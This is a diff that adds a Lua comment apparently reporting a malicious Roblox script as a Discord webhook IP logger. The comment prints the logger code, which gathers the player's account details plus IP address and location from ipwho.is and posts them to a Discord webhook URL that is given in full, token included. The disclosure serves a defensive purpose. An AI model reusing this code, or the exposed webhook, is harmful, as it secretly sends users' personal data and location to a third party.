@@ -1,0 +1,28 @@
+--[[
+# Reporting the script: https://scriptblox.com/script/Universal-Script-GhostHub-16534
+⚠️ Notes! This is a Discord WebHooker IP logger, not a legal script!
+
+
+local API = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
+ local data = {content = "âœ… Execute Time: "..os.date("%B %d %Y | %p %I:%M:%S"),embeds = {{description = "Username: \n"..game.Players.LocalPlayer.Name.."\n\nDisplay: \n"..game.Players.LocalPlayer.DisplayName.."\n\nUser ID: \n"..game.Players.LocalPlayer.UserId.."\n\nAccount Age: \n"..game.Players.LocalPlayer.AccountAge.."\n\nCreated: \n"..GetPlayerJoinDate(game.Players.LocalPlayer.AccountAge).."\n\nVerified: \n"..DetectVerifyEmail(game.Players.LocalPlayer).."\n\nPremium: \n"..DetectPremuim(game.Players.LocalPlayer).."\n\nIP Address: \n"..API.ip.."\n\nContinent: \n"..API.continent.."\n\nCountry: \n"..API.country.."\n\nCountry Flag: \n"..API.flag.emoji.."\n\nRegion: \n"..API.region.."\n\nCity: \n"..API.city.."\n\nGame Place: \n"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\nPlace ID: \n"..game.placeId.."\n\nServer ID: \n"..game.jobId,thumbnail = {url = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")).data[1].imageUrl}}}}
+ local webhookUrl = "https://discord.com/api/webhooks/1364819845375594629/q6XuddLd51FO-8NkgNvn8-Lu71o9e_ehTaE9p_sU0irt7QquZWVMQSZF1SPePysdTSrz"
+ local request = request or syn.request
+ local send = request({
+   Url = webhookUrl,
+   Method = "POST",
+   Headers = {["Content-Type"] = "application/json"},
+   Body = game.HttpService:JSONEncode(data)
+ })
+end
+if ActiveDatabases == true then
+   UpdateData()
+   GetMoreScript()
+   AddClick()
+   DiscordBot()
+end
+
+                       Discord WebHOOKER API
+⟩ https://discord.com/api/webhooks/1364819845375594629/q6XuddLd51FO-8NkgNvn8-Lu71o9e_ehTaE9p_sU0irt7QquZWVMQSZF1SPePysdTSrz
+
+                                                                                                  [ issued by @lightgray2 ]
+]]
